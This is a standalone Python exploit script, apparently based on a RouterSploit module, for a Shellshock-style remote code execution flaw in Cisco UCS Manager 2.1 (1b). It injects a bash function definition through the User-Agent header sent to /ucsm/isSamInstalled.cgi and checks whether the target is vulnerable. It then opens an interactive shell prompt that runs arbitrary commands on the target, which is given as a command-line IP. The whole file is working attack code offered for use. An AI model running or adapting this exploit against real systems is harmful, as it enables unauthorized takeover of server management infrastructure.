target = ""
# rsf exploit module
# description: Module exploits Cisco UCS Manager 2.1 (1b) Remote Code Execution vulnerability allowing command execution.

import requests
import re
import random
import string

class Exploit:
    def __init__(self):
        self.target = ""
        self.port = 80

    def random_text(self, n):
        return ''.join(random.choice(string.ascii_letters) for _ in range(n))

    def execute(self, cmd):
        mark = self.random_text(32)
        headers = {
            "User-Agent": f'() {{ test;}};echo \"Content-type: text/plain\"; echo; echo; echo {mark}; echo "$({cmd})"; echo {mark};'
        }
        
        try:
            response = requests.get(
                f"http://{self.target}:{self.port}/ucsm/isSamInstalled.cgi",
                headers=headers
            )
            if response and mark in response.text:
                regexp = f"{mark}(|.+?){mark}"
                res = re.findall(regexp, response.text, re.DOTALL)
                return res[0] if res else ""
        except:
            return ""
        return ""

    def run(self):
        if self.check():
            print("[+] Target is vulnerable")
            while True:
                cmd = input("cmd> ")
                if cmd.lower() in ["exit", "quit"]:
                    break
                print(self.execute(cmd))
        else:
            print("[-] Target not vulnerable")

    def check(self):
        mark = self.random_text(32)
        return mark in self.execute(f"echo {mark}")



import sys

if __name__ == "__main__":
    print("Run script:", __file__)
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    exploit = Exploit()
    exploit.target = target_ip
    exploit.run()
